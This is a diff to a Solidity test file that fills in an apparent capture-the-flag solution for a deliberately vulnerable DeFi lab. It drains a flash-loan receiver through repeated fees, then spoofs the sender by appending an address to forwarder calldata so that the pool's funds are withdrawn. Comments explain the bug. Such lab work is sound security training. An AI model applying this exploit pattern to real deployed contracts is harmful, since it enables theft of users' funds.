@@ -7,6 +7,9 @@ import {NaiveReceiverPool, Multicall, WETH} from "../../src/naive-receiver/Naive
 import {FlashLoanReceiver} from "../../src/naive-receiver/FlashLoanReceiver.sol";
 import {BasicForwarder} from "../../src/naive-receiver/BasicForwarder.sol";
 
+// My solution. Add imports.
+import {IERC3156FlashLender} from "@openzeppelin/contracts/interfaces/IERC3156FlashLender.sol";
+
 contract NaiveReceiverChallenge is Test {
     address deployer = makeAddr("deployer");
     address recovery = makeAddr("recovery");
@@ -77,7 +80,50 @@ contract NaiveReceiverChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_naiveReceiver() public checkSolvedByPlayer {
-        
+        // Multicall FlashLoanReceiver 10 times - it will pay 10 eth to the lender through fees.
+        bytes[] memory multicallInstructions = new bytes[](10+1);
+        for (uint256 index = 0; index < 10; ++index) {
+            multicallInstructions[index] = abi.encodeCall(
+              IERC3156FlashLender.flashLoan,
+              (receiver, address(weth), 1e15, ""));
+        }
+
+        // NaiveReceiverPool::withdraw has a bug. It subtracts the balance of the address
+        // packed in forwarder's data. But then it sends the funds to the address passed into
+        // it as a parameter.
+        multicallInstructions[10] = abi.encodePacked(
+            abi.encodeCall(NaiveReceiverPool.withdraw,
+            (WETH_IN_POOL + WETH_IN_RECEIVER, payable(recovery))),
+            deployer
+        );
+        // ↑↑↑ Call pool's withdraw, but use encodePacked to also add deployer's address in the data.
+        // Deployer's address is not part of function selector + parameters, so it's ignored by
+        // forwarder's delegateCall. But it is then used inside pool's _msgSender and gets tokens drained.
+
+        // First test: pool.multicall(multicallInstructions);
+        BasicForwarder.Request memory request = BasicForwarder.Request({
+                from:player,
+                nonce: 0,
+                data: abi.encodeCall(Multicall.multicall, (multicallInstructions)),
+                value:0,
+                deadline: block.timestamp,
+                target: address(pool),
+                gas: gasleft()
+        });
+        // ↑↑↑ create a request to call `multicall` function of the pool. The author conveniently
+        //  gave flashLoan and multicall to the same contract.
+        bytes32 requestDataHash = forwarder.getDataHash(request);
+        bytes32 kecak = keccak256(
+            abi.encodePacked(
+                "\x19\x01",
+                forwarder.domainSeparator(),
+                requestDataHash
+            )
+        );
+        (uint8 v, bytes32 r, bytes32 s) = vm.sign(playerPk, kecak);
+        bytes memory signature = abi.encodePacked(r, s, v);
+
+        forwarder.execute(request, signature);
     }
 
     /**
